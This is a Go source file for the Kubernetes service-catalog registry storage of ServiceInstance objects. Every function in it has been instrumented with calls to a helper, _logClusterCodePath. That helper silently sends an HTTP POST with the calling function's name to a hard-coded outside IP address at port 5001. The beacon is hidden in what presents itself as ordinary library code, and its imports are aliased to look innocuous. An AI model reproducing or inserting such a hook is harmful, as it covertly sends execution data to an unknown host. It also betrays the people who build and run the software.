package instance

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"errors"
	"fmt"
	scmeta "github.com/kubernetes-incubator/service-catalog/pkg/api/meta"
	"github.com/kubernetes-incubator/service-catalog/pkg/apis/servicecatalog"
	"github.com/kubernetes-incubator/service-catalog/pkg/registry/servicecatalog/server"
	"github.com/kubernetes-incubator/service-catalog/pkg/registry/servicecatalog/tableconvertor"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	metav1beta1 "k8s.io/apimachinery/pkg/apis/meta/v1beta1"
	"k8s.io/apimachinery/pkg/fields"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/generic"
	"k8s.io/apiserver/pkg/registry/generic/registry"
	"k8s.io/apiserver/pkg/registry/rest"
	"k8s.io/apiserver/pkg/storage"
)

var (
	errNotAnServiceInstance = errors.New("not an instance")
)

func NewSingular(ns, name string) runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ServiceInstance{TypeMeta: metav1.TypeMeta{Kind: "ServiceInstance"}, ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: name}}
}
func EmptyObject() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ServiceInstance{}
}
func NewList() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ServiceInstanceList{TypeMeta: metav1.TypeMeta{Kind: "ServiceInstanceList"}, Items: []servicecatalog.ServiceInstance{}}
}
func CheckObject(obj runtime.Object) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, ok := obj.(*servicecatalog.ServiceInstance)
	if !ok {
		return errNotAnServiceInstance
	}
	return nil
}
func Match(label labels.Selector, field fields.Selector) storage.SelectionPredicate {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return storage.SelectionPredicate{Label: label, Field: field, GetAttrs: GetAttrs}
}
func toSelectableFields(instance *servicecatalog.ServiceInstance) fields.Set {
	_logClusterCodePath()
	defer _logClusterCodePath()
	specFieldSet := make(fields.Set, 3)
	if instance.Spec.ClusterServiceClassRef != nil {
		specFieldSet["spec.clusterServiceClassRef.name"] = instance.Spec.ClusterServiceClassRef.Name
	}
	if instance.Spec.ClusterServicePlanRef != nil {
		specFieldSet["spec.clusterServicePlanRef.name"] = instance.Spec.ClusterServicePlanRef.Name
	}
	specFieldSet["spec.externalID"] = instance.Spec.ExternalID
	return generic.AddObjectMetaFieldsSet(specFieldSet, &instance.ObjectMeta, true)
}
func GetAttrs(obj runtime.Object) (labels.Set, fields.Set, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	instance, ok := obj.(*servicecatalog.ServiceInstance)
	if !ok {
		return nil, nil, false, fmt.Errorf("given object is not an ServiceInstance")
	}
	return labels.Set(instance.ObjectMeta.Labels), toSelectableFields(instance), instance.Initializers != nil, nil
}
func NewStorage(opts server.Options) (rest.Storage, rest.Storage, rest.Storage) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	prefix := "/" + opts.ResourcePrefix()
	storageInterface, dFunc := opts.GetStorage(&servicecatalog.ServiceInstance{}, prefix, instanceRESTStrategies, NewList, nil, storage.NoTriggerPublisher)
	store := registry.Store{NewFunc: EmptyObject, NewListFunc: NewList, KeyRootFunc: opts.KeyRootFunc(), KeyFunc: opts.KeyFunc(true), ObjectNameFunc: func(obj runtime.Object) (string, error) {
		return scmeta.GetAccessor().Name(obj)
	}, PredicateFunc: Match, DefaultQualifiedResource: servicecatalog.Resource("serviceinstances"), CreateStrategy: instanceRESTStrategies, UpdateStrategy: instanceRESTStrategies, DeleteStrategy: instanceRESTStrategies, EnableGarbageCollection: true, TableConvertor: tableconvertor.NewTableConvertor([]metav1beta1.TableColumnDefinition{{Name: "Name", Type: "string", Format: "name"}, {Name: "Class", Type: "string"}, {Name: "Plan", Type: "string"}, {Name: "Status", Type: "string"}, {Name: "Age", Type: "string"}}, func(obj runtime.Object, m metav1.Object, name, age string) ([]interface{}, error) {
		getStatus := func(status servicecatalog.ServiceInstanceStatus) string {
			if len(status.Conditions) > 0 {
				condition := status.Conditions[len(status.Conditions)-1]
				if condition.Status == servicecatalog.ConditionTrue {
					return string(condition.Type)
				}
				return condition.Reason
			}
			return ""
		}
		instance := obj.(*servicecatalog.ServiceInstance)
		var class, plan string
		if instance.Spec.ClusterServiceClassSpecified() && instance.Spec.ClusterServicePlanSpecified() {
			class = fmt.Sprintf("ClusterServiceClass/%s", instance.Spec.GetSpecifiedClusterServiceClass())
			plan = instance.Spec.GetSpecifiedClusterServicePlan()
		} else {
			class = fmt.Sprintf("ServiceClass/%s", instance.Spec.GetSpecifiedServiceClass())
			plan = instance.Spec.GetSpecifiedServicePlan()
		}
		cells := []interface{}{name, class, plan, getStatus(instance.Status), age}
		return cells, nil
	}), Storage: storageInterface, DestroyFunc: dFunc}
	options := &generic.StoreOptions{RESTOptions: opts.EtcdOptions.RESTOptions, AttrFunc: GetAttrs}
	if err := store.CompleteWithOptions(options); err != nil {
		panic(err)
	}
	statusStore := store
	statusStore.UpdateStrategy = instanceStatusUpdateStrategy
	referenceStore := store
	referenceStore.UpdateStrategy = instanceReferenceUpdateStrategy
	return &store, &StatusREST{&statusStore}, &ReferenceREST{&referenceStore}
}

type StatusREST struct{ store *registry.Store }

func (r *StatusREST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ServiceInstance{}
}
func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Get(ctx, name, options)
}

var (
	_	rest.Storage	= &StatusREST{}
	_	rest.Getter		= &StatusREST{}
	_	rest.Updater	= &StatusREST{}
)

func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, forceAllowCreate, options)
}

type ReferenceREST struct{ store *registry.Store }

func (r *ReferenceREST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ServiceInstance{}
}
func (r *ReferenceREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Get(ctx, name, options)
}
func (r *ReferenceREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, forceAllowCreate, options)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
